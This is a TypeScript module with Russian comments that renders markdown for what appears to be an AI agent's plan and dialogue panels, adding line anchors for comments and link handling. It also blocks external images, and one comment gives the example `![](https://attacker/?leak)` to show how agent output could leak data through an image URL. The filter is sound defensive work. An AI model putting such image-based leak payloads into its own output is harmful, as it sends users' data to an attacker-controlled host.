import MarkdownIt from 'markdown-it'
import Token from 'markdown-it/lib/token.mjs'

// Единственный экземпляр markdown-it на модуль (конфигурация дословно из app.js).
const md = new MarkdownIt({ html: false, linkify: true })

// Внешние ссылки открываются в новой вкладке (decorateLinks в app.js) — через
// переопределение рендерера, чтобы работало с dangerouslySetInnerHTML без DOM-доступа.
const renderLinkOpen =
  md.renderer.rules.link_open ??
  ((tokens, idx, options, _env, self) => self.renderToken(tokens, idx, options))

md.renderer.rules.link_open = (tokens, idx, options, env, self) => {
  const token = tokens[idx]
  if (token === undefined) {
    return renderLinkOpen(tokens, idx, options, env, self)
  }

  if (token.attrIndex('target') < 0) {
    token.attrPush(['target', '_blank'])
    token.attrPush(['rel', 'noopener'])
  }

  return renderLinkOpen(tokens, idx, options, env, self)
}

// Глушение внешних markdown-картинок. `![](https://attacker/?leak)` — существующий канал эксфильтрации из
// текста агента: браузер тянет внешний URL при рендере.
const renderImage =
  md.renderer.rules.image ??
  ((tokens, idx, options, _env, self) => self.renderToken(tokens, idx, options))

// isSameOriginImageSrc — true для относительных/абсолютно-путевых ссылок того же
// origin; false для protocol-relative (`//host`) и любой явной схемы (`scheme:`).
export function isSameOriginImageSrc(src: string): boolean {
  if (src === '' || src.startsWith('//')) return false
  // Явная схема вида `http:`, `data:`, `javascript:` — RFC3986 scheme-префикс.
  if (/^[a-zA-Z][a-zA-Z0-9+.-]*:/.test(src)) return false
  return true
}

md.renderer.rules.image = (tokens, idx, options, env, self) => {
  const token = tokens[idx]
  const src = token?.attrGet('src') ?? ''
  if (!isSameOriginImageSrc(src)) {
    return escapeHtml(token?.content ?? '')
  }
  return renderImage(tokens, idx, options, env, self)
}

export type SpecialSection = {
  css: string
  icon: string
  label: string
}

const SPECIAL_SECTIONS: Record<string, SpecialSection> = {
  '## Assumptions': { css: 'plan-section-assumptions', icon: '⚠', label: 'Assumptions' },
  '## Acceptance Criteria': { css: 'plan-section-criteria', icon: '✓', label: 'Acceptance Criteria' },
}

// codeBlockLineRanges берёт 0-based [start,end) из markdown-it, чтобы маркеры картинок внутри любого
// code-блока оставались текстом.
export function codeBlockLineRanges(text: string): Array<[number, number]> {
  const ranges: Array<[number, number]> = []
  for (const token of md.parse(text, {})) {
    if ((token.type === 'fence' || token.type === 'code_block') && token.map !== null) {
      ranges.push([token.map[0], token.map[1]])
    }
  }
  return ranges
}

// Блочный рендер markdown: спецсекции (## Assumptions / ## Acceptance Criteria) в сворачиваемых обёртках +
// чекбоксы. Соответствует renderMarkdownHTML + decorate в текущем app.js.
export function renderMarkdown(text: string): string {
  if (text.trim() === '') return ''

  return decorateCheckboxes(splitAndRender(text))
}

// Нейтральный блочный рендер markdown БЕЗ plan-специфики: не сворачивает спец-секции и НЕ применяет
// decorateCheckboxes.
export function renderPlainMarkdown(text: string): string {
  if (text.trim() === '') return ''
  return md.render(text)
}

export function escapeHtml(value: string): string {
  return value.replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;')
}

export function isSpecialSection(line: string): SpecialSection | null {
  return SPECIAL_SECTIONS[line.trim()] ?? null
}

export function isHeading2(line: string): boolean {
  return line.trim().startsWith('## ')
}

function splitAndRender(text: string): string {
  const lines = text.split('\n')

  const out: string[] = []
  let buffer: string[] = []
  let inSection = false
  let inCode = false

  const flush = () => {
    if (buffer.length > 0) {
      out.push(md.render(buffer.join('\n')))
      buffer = []
    }
  }

  for (const line of lines) {
    if (line.trim().startsWith('```')) {
      inCode = !inCode
      buffer.push(line)
      continue
    }

    if (inCode) {
      buffer.push(line)
      continue
    }

    const section = SPECIAL_SECTIONS[line.trim()]
    if (section !== undefined) {
      flush()
      if (inSection) out.push('</div></div>')
      out.push(
        `<div class="plan-section-wrapper ${section.css}">` +
          `<h2 class="section-header">${section.icon} ${section.label}</h2>` +
          `<div class="plan-section-body">`,
      )
      inSection = true
      continue
    }

    if (inSection && isHeading2(line)) {
      flush()
      out.push('</div></div>')
      inSection = false
    }

    buffer.push(line)
  }

  flush()
  if (inSection) out.push('</div></div>')

  return out.join('')
}

function decorateCheckboxes(html: string): string {
  return html
    .replace(/\[x\]/g, '<span class="cb cb-done">&#10003;</span>')
    .replace(/\[ \]/g, '<span class="cb cb-open">&#9744;</span>')
}

// Отдельный markdown-it для data-line якорей изолирует правила fence/checkbox от остальных рендеров;
// html:false.
const anchoredMd = new MarkdownIt({ html: false, linkify: true })

// Те же правила безопасности, что у общего `md`: внешние ссылки target=_blank/rel, глушение внешних
// (не-same-origin) картинок. Дублируем на anchoredMd, а не мутируем общий экземпляр.
const anchoredLinkOpen =
  anchoredMd.renderer.rules.link_open ??
  ((tokens, idx, options, _env, self) => self.renderToken(tokens, idx, options))

anchoredMd.renderer.rules.link_open = (tokens, idx, options, env, self) => {
  const token = tokens[idx]
  if (token === undefined) {
    return anchoredLinkOpen(tokens, idx, options, env, self)
  }
  if (token.attrIndex('target') < 0) {
    token.attrPush(['target', '_blank'])
    token.attrPush(['rel', 'noopener'])
  }
  return anchoredLinkOpen(tokens, idx, options, env, self)
}

const anchoredImage =
  anchoredMd.renderer.rules.image ??
  ((tokens, idx, options, _env, self) => self.renderToken(tokens, idx, options))

anchoredMd.renderer.rules.image = (tokens, idx, options, env, self) => {
  const token = tokens[idx]
  const src = token?.attrGet('src') ?? ''
  if (!isSameOriginImageSrc(src)) {
    return escapeHtml(token?.content ?? '')
  }
  return anchoredImage(tokens, idx, options, env, self)
}

// Token-aware чекбоксы: подменяем ТОЛЬКО правило `text` — вызываем сохранённый дефолтный рендерер, затем
// заменяем литеральные `[x]`/`[ ]` в его БЕЗОПАСНОМ результате.
const anchoredText =
  anchoredMd.renderer.rules.text ??
  ((tokens, idx) => escapeHtml(tokens[idx]?.content ?? ''))

anchoredMd.renderer.rules.text = (tokens, idx, options, env, self) => {
  return anchoredText(tokens, idx, options, env, self)
    .replace(/\[x\]/g, '<span class="cb cb-done">&#10003;</span>')
    .replace(/\[ \]/g, '<span class="cb cb-open">&#9744;</span>')
}

type AnchoredToken = ReturnType<typeof anchoredMd.parse>[number]

// Строки кода — отдельные якоря внутри <pre>, поэтому комментарий ставится на конкретную строку, а не на
// весь блок. Экранирование остаётся за штатным рендерером: он отдаёт <code>…</code> с уже безопасным телом.
function wrapCodeLines(escapedBody: string, codeLines: Array<number | null>): string {
  if (codeLines.length === 0) return ''
  const lines = escapedBody.split('\n')
  if (escapedBody.endsWith('\n')) lines.pop()
  return lines
    .map((line, i) => {
      const dataLine = codeLines[i] ?? null
      return dataLine === null
        ? `<span class="md-code-line">${line}</span>`
        : `<span class="md-code-line" ${anchorAttrString(dataLine)}>${line}</span>`
    })
    .join('')
}

// Строка-маркер fence (```lang / ```) показывается внутри <pre> такой же строкой, как код: у неё свой номер и
// своё выравнивание, а не отдельный блок снаружи рамки.
function fenceMarkerRow(line: number, sourceLines: string[]): string {
  const source = escapeHtml((sourceLines[line - 1] ?? '').trim())
  return `<span class="md-code-line md-fence-line" ${anchorAttrString(line)}>${source}</span>`
}

// fence/code_block wrapper-rule: номера строк лежат в token.meta. Никогда не конкатенируем
// token.info/token.content напрямую (XSS).
function wrapFenceRule(defaultRule: NonNullable<typeof anchoredMd.renderer.rules.fence>) {
  return (
    tokens: Parameters<typeof defaultRule>[0],
    idx: number,
    options: Parameters<typeof defaultRule>[2],
    env: unknown,
    self: Parameters<typeof defaultRule>[4],
  ): string => {
    const meta = tokens[idx]?.meta as CodeMeta | undefined
    const rendered = defaultRule(tokens, idx, options, env as never, self)
    if (meta === undefined) return rendered
    const { sourceLines } = env as AnchoredEnv
    const openRow = meta.dataLine === undefined ? '' : fenceMarkerRow(meta.dataLine, sourceLines)
    const closeRow = meta.closeLine === undefined ? '' : fenceMarkerRow(meta.closeLine, sourceLines)
    return rendered.replace(
      /(<code[^>]*>)([\s\S]*)(<\/code>)/,
      (_match, open: string, body: string, close: string) => open + openRow + wrapCodeLines(body, meta.codeLines) + closeRow + close,
    )
  }
}

const defaultFence =
  anchoredMd.renderer.rules.fence ??
  ((tokens, idx, options, _env, self) => self.renderToken(tokens, idx, options))
anchoredMd.renderer.rules.fence = wrapFenceRule(defaultFence)

const defaultCodeBlock =
  anchoredMd.renderer.rules.code_block ??
  ((tokens, idx, options, _env, self) => self.renderToken(tokens, idx, options))
anchoredMd.renderer.rules.code_block = wrapFenceRule(defaultCodeBlock)

// Разделитель таблицы (|---|---|) не имеет собственного элемента: даём ему тонкую строку в конце thead.
const defaultTheadClose =
  anchoredMd.renderer.rules.thead_close ??
  ((tokens, idx, options, _env, self) => self.renderToken(tokens, idx, options))

anchoredMd.renderer.rules.thead_close = (tokens, idx, options, env, self) => {
  const meta = tokens[idx]?.meta as TableRuleMeta | undefined
  const rule =
    meta === undefined
      ? ''
      : `<tr class="md-table-rule" ${anchorAttrString(meta.ruleLine)}><td colspan="${meta.columns}" data-row-line="${meta.ruleLine}"></td></tr>\n`
  return rule + defaultTheadClose(tokens, idx, options, env, self)
}

// Один top-level markdown-блок, отрендеренный ЦЕЛИКОМ. gap — строка вне блоков (пустая, определение ссылки):
// без собственных margin, её высота — только сама строка-заглушка.
export type Block = { startLine: number; endLineExclusive: number; html: string; gap?: true }

// Секция: 'plain' — обычные блоки; 'special' — спец-секция плана, у которой ЗАГОЛОВОК вырезан.
export type Section = { kind: 'plain' | 'special'; special?: SpecialSection; blocks: Block[] }

// env парса/рендера: исходные строки нужны правилу fence, чтобы показать строки-маркеры ```.
type AnchoredEnv = { sourceLines: string[] }

// Строки, которые у fence/code_block подписываются номерами (1-based; null — строка уже занята другим якорем).
type CodeMeta = { dataLine?: number; codeLines: Array<number | null>; closeLine?: number }
type TableRuleMeta = { ruleLine: number; columns: number }

// Атрибуты якоря, попадающие в innerHTML. Значения безопасны (только числовой номер строки), но React ими
// НЕ владеет — их навешивает/снимает императивный слой (Part B).
function anchorAttrPairs(line: number): Array<[string, string]> {
  return [
    ['data-line', String(line)],
    ['tabindex', '-1'],
    ['aria-keyshortcuts', 'Enter'],
    ['aria-description', `Press Enter to comment on line ${line}`],
  ]
}

function anchorAttrString(line: number): string {
  return anchorAttrPairs(line)
    .map(([k, v]) => `${k}="${v}"`)
    .join(' ')
}

// Строка, у которой нет собственного отрисованного элемента (пустая, разделитель, закрывающий fence): показываем
// исходный текст; номер рисует CSS из data-line, как у остальных строк. <span>, а не <div>: строка может оказаться внутри <p>/<h1>.
function lineRowHtml(line: number, source: string): string {
  const blank = source.trim() === ''
  return (
    `<span class="md-line-row${blank ? ' md-line-blank' : ''}" ${anchorAttrString(line)}>` +
    `<span class="md-line-src">${escapeHtml(source)}</span></span>`
  )
}

// Строка, чей исходный текст уже показан внутри абзаца: пустая строка-якорь, номер рисует CSS.
function numberOnlyRowHtml(line: number): string {
  return `<span class="md-line-row" ${anchorAttrString(line)}></span>`
}

// Кандидаты якорей: open-токены под-элементов + self-closing hr и fence. Строки code_block якорятся построчно.
const OPEN_ANCHOR_CANDIDATES = new Set([
  'heading_open',
  'paragraph_open',
  'list_item_open',
  'blockquote_open',
  'tr_open',
])
const SELF_ANCHOR_CANDIDATES = new Set(['hr', 'fence'])

function isAnchorCandidate(token: AnchoredToken): boolean {
  if (token.map === null) return false
  if (OPEN_ANCHOR_CANDIDATES.has(token.type)) return token.nesting === 1 && !token.hidden
  if (SELF_ANCHOR_CANDIDATES.has(token.type)) return token.nesting === 0
  return false
}

// Якорь начала блока: вложенные кандидаты на ДРУГИХ строках (loose-list 2-й абзац, абзац blockquote, вложенный
// li) — самостоятельные якоря. Занятые строки записываются в covered (0-based).
function annotateBlockStarts(tokens: AnchoredToken[], covered: Set<number>): void {
  const bestByLine = new Map<number, number>() // startLine(0-based) -> chosen token index

  for (let i = 0; i < tokens.length; i++) {
    const token = tokens[i]
    if (token === undefined || !isAnchorCandidate(token)) continue
    const line = (token.map as [number, number])[0]
    const current = bestByLine.get(line)
    // Строгое `<` сохраняет первый токен при равном level (ничья — по порядку).
    if (current === undefined || token.level < tokens[current]!.level) {
      bestByLine.set(line, i)
    }
  }

  for (const [line, idx] of bestByLine) {
    const token = tokens[idx]!
    const dataLine = line + 1
    covered.add(line)
    if (token.type === 'fence') {
      token.meta = { ...(token.meta ?? {}), dataLine }
    } else {
      for (const [k, v] of anchorAttrPairs(dataLine)) token.attrSet(k, v)
    }
  }
}

function contentLineCount(content: string): number {
  if (content === '') return 0
  return content.split('\n').length - (content.endsWith('\n') ? 1 : 0)
}

// Каждая строка кода и закрывающая строка fence получают свой якорь.
function annotateCodeLines(tokens: AnchoredToken[], covered: Set<number>): void {
  for (const token of tokens) {
    if ((token.type !== 'fence' && token.type !== 'code_block') || token.map === null) continue
    const [start, end] = token.map
    const first = token.type === 'fence' ? start + 1 : start
    const count = contentLineCount(token.content)
    const codeLines = Array.from({ length: count }, (_, i): number | null => {
      if (covered.has(first + i)) return null
      covered.add(first + i)
      return first + i + 1
    })
    const closeIndex = end - 1
    const closed = token.type === 'fence' && end - start === count + 2 && !covered.has(closeIndex)
    if (closed) covered.add(closeIndex)
    token.meta = { ...(token.meta ?? {}), codeLines, ...(closed ? { closeLine: end } : {}) }
  }
}

// У <td> нет доступа к data-line родителя <tr>: номер строки дублируется на первой ячейке — для плашки в CSS.
function annotateTableRowPlates(tokens: AnchoredToken[]): void {
  let rowLine: string | null = null
  for (const token of tokens) {
    if (token.type === 'tr_open') {
      rowLine = token.attrGet('data-line')
    } else if (rowLine !== null && (token.type === 'th_open' || token.type === 'td_open')) {
      token.attrSet('data-row-line', rowLine)
      rowLine = null
    }
  }
}

// Разделитель таблицы идёт сразу за строкой заголовка.
function annotateTableRules(tokens: AnchoredToken[], covered: Set<number>): void {
  let headStart: number | null = null
  let columns = 0
  for (const token of tokens) {
    if (token.type === 'thead_open' && token.map !== null) {
      headStart = token.map[0]
      columns = 0
    } else if (token.type === 'th_open') {
      columns++
    } else if (token.type === 'thead_close' && headStart !== null && !covered.has(headStart + 1)) {
      covered.add(headStart + 1)
      token.meta = { ruleLine: headStart + 2, columns } satisfies TableRuleMeta
      headStart = null
    }
  }
}

function htmlInline(content: string): AnchoredToken {
  const token = new Token('html_inline', '', 0)
  token.content = content
  return token
}

const isLineBreak = (token: AnchoredToken): boolean => token.type === 'softbreak' || token.type === 'hardbreak'

const FIRST_LINE_OPEN = '<span class="md-first-line">'

// У пункта списка или абзаца цитаты, чьё содержимое — не последний блок (вложенный список, второй абзац,
// строка-заглушка после пункта), значок комментария нельзя поставить в конец элемента: первая строка
// получает собственную обёртку.
function hasBlocksAfterText(tokens: AnchoredToken[], index: number): boolean {
  const opener = tokens[index - 2]
  const paragraph = tokens[index - 1]
  if (paragraph?.type !== 'paragraph_open') return false
  if (opener?.type === 'blockquote_open') return true
  if (opener?.type !== 'list_item_open') return false
  if (!paragraph.hidden || tokens[index + 2]?.type !== 'list_item_close') return true
  return (opener.map?.[1] ?? 0) > (paragraph.map?.[1] ?? 0)
}

// Каждая строка абзаца — свой блок (md-first-line, md-cont-line); форматирование через перенос закрывается и
// открывается заново. Если переносов меньше строк (многострочный code-span), текст не трогаем: строки получают
// пустые якоря с номером.
function annotateContinuationLines(tokens: AnchoredToken[], covered: Set<number>): void {
  tokens.forEach((token, index) => {
    if (token.type !== 'inline' || token.map === null || token.children === null) return
    const [start, end] = token.map
    if (end - start < 2) {
      if (hasBlocksAfterText(tokens, index)) token.children = [htmlInline(FIRST_LINE_OPEN), ...token.children, htmlInline('</span>')]
      return
    }
    const breaks = token.children.filter(isLineBreak).length
    if (breaks !== end - start - 1) {
      for (let line = start + 1; line < end; line++) {
        if (covered.has(line)) continue
        covered.add(line)
        token.children.push(htmlInline(numberOnlyRowHtml(line + 1)))
      }
      return
    }
    if (Array.from({ length: breaks }, (_, i) => start + i + 1).some((line) => covered.has(line))) return

    const children: AnchoredToken[] = [htmlInline(FIRST_LINE_OPEN)]
    const openTags: AnchoredToken[] = []
    let line = start
    for (const child of token.children) {
      if (!isLineBreak(child)) {
        children.push(child)
        if (child.nesting === 1) openTags.push(child)
        else if (child.nesting === -1) openTags.pop()
        continue
      }
      for (const open of [...openTags].reverse()) children.push(htmlInline(`</${open.tag}>`))
      children.push(htmlInline('</span>'))
      // Строки — блоки, поэтому <br> между ними дал бы лишнюю пустую строку.
      children.push(child.type === 'hardbreak' ? htmlInline('\n') : child)
      line++
      covered.add(line)
      children.push(htmlInline(`<span class="md-cont-line" ${anchorAttrString(line + 1)}>`), ...openTags)
    }
    children.push(htmlInline('</span>'))
    token.children = children
  })
}

// Строка-заглушка в потоке токенов: html_block рендерится как есть.
function rowToken(line: number, level: number, sourceLines: string[]): AnchoredToken {
  const token = new Token('html_block', '', 0)
  token.content = lineRowHtml(line + 1, sourceLines[line] ?? '')
  token.map = [line, line + 1]
  token.level = level
  token.meta = { row: true }
  return token
}

// Строки без якоря (пустые, определения ссылок, подчёркивание setext) вставляются как строки-заглушки в самый
// внутренний контейнер, куда они попадают по номеру; вне блоков получаются отдельные top-level блоки.
function insertUncoveredRows(tokens: AnchoredToken[], covered: Set<number>, sourceLines: string[], lineCount: number): AnchoredToken[] {
  const pending: number[] = []
  for (let line = 0; line < lineCount; line++) if (!covered.has(line)) pending.push(line)

  const out: AnchoredToken[] = []
  const open: AnchoredToken[] = []
  let next = 0
  const flushBefore = (limit: number): void => {
    while (next < pending.length && pending[next]! < limit) {
      out.push(rowToken(pending[next]!, open.length, sourceLines))
      next++
    }
  }

  for (const token of tokens) {
    if (token.type !== 'inline') {
      if (token.nesting === -1) {
        const opener = open.pop()
        if (opener?.map) flushBefore(opener.map[1])
      } else if (token.map !== null) {
        flushBefore(token.map[0])
      }
    }
    out.push(token)
    if (token.nesting === 1) open.push(token)
  }
  flushBefore(Infinity)
  return out
}

// Сегментация на top-level блоки: от open-токена уровня 0 до matching close уровня 0. Блок НЕ рвём —
// удаление одного heading_open оставило бы висячие inline+heading_close.
type TopBlockRange = { open: number; closeExclusive: number; map: [number, number] }

function topBlockRanges(tokens: ReturnType<typeof anchoredMd.parse>): TopBlockRange[] {
  const ranges: TopBlockRange[] = []
  let i = 0
  while (i < tokens.length) {
    const token = tokens[i]
    if (token === undefined || token.level !== 0) {
      i++
      continue
    }
    if (token.nesting === 1) {
      // Найти matching close уровня 0.
      let j = i + 1
      while (j < tokens.length && !(tokens[j]!.level === 0 && tokens[j]!.nesting === -1)) j++
      if (token.map !== null) ranges.push({ open: i, closeExclusive: j + 1, map: token.map })
      i = j + 1
    } else if (token.nesting === 0) {
      if (token.map !== null) ranges.push({ open: i, closeExclusive: i + 1, map: token.map })
      i++
    } else {
      i++
    }
  }
  return ranges
}

// renderAnchoredSections — главный anchored-рендер. ОДИН парс полного текста → token.map ГЛОБАЛЬНЫЕ.
// Каждая исходная строка 1..N получает ровно один элемент с data-line.
export function renderAnchoredSections(
  text: string,
  opts: { specialSections: boolean },
): Section[] {
  if (text.trim() === '') return []

  const lines = text.split('\n')
  // Хвостовой перевод строки не открывает ещё одну строку.
  const lineCount = text.endsWith('\n') ? lines.length - 1 : lines.length
  const env: AnchoredEnv = { sourceLines: lines }
  const parsed = anchoredMd.parse(text, env)

  const covered = new Set<number>()
  annotateBlockStarts(parsed, covered)
  annotateTableRowPlates(parsed)
  annotateCodeLines(parsed, covered)
  annotateTableRules(parsed, covered)
  annotateContinuationLines(parsed, covered)
  const tokens = insertUncoveredRows(parsed, covered, lines, lineCount)

  const renderBlockRange = (range: TopBlockRange): Block => {
    const slice = tokens.slice(range.open, range.closeExclusive)
    const isRow = tokens[range.open]?.meta?.row === true
    return {
      startLine: range.map[0] + 1,
      endLineExclusive: range.map[1] + 1,
      html: anchoredMd.renderer.render(slice, anchoredMd.options, env),
      ...(isRow ? { gap: true as const } : {}),
    }
  }

  const ranges = topBlockRanges(tokens)

  // DialogChannel: плоские блоки, спец-секции не трогаем.
  if (!opts.specialSections) {
    return [{ kind: 'plain', blocks: ranges.map(renderBlockRange) }]
  }

  // PlanPanel: группировка по спец-секциям.
  const sections: Section[] = []
  let current: Section = { kind: 'plain', blocks: [] }

  const pushCurrent = () => {
    // Пустые 'plain'-секции отбрасываем; 'special' сохраняем даже без блоков
    // (заголовок/обёртка должны отрисоваться).
    if (current.kind === 'special' || current.blocks.length > 0) sections.push(current)
  }

  for (const range of ranges) {
    const rawLine = lines[range.map[0]] ?? ''
    const special = isSpecialSection(rawLine)
    if (special !== null) {
      // Открываем новую спец-секцию, ВЫРЕЗАЯ её heading-блок (open+inline+close); строка заголовка остаётся
      // доступной для комментария как строка-заглушка.
      pushCurrent()
      current = { kind: 'special', special, blocks: [] }
      for (let line = range.map[0]; line < range.map[1]; line++) {
        const row = rowToken(line, 0, lines)
        current.blocks.push({
          startLine: line + 1,
          endLineExclusive: line + 2,
          html: anchoredMd.renderer.render([row], anchoredMd.options, env),
          gap: true,
        })
      }
      continue
    }
    // Закрытие спец-секции — следующий top-level H2 (в т.ч. обычный ## Other),
    // который затем рендерится нормально в новой 'plain'-секции.
    if (current.kind === 'special' && isHeading2(rawLine)) {
      pushCurrent()
      current = { kind: 'plain', blocks: [] }
    }
    current.blocks.push(renderBlockRange(range))
  }
  pushCurrent()

  return sections
}
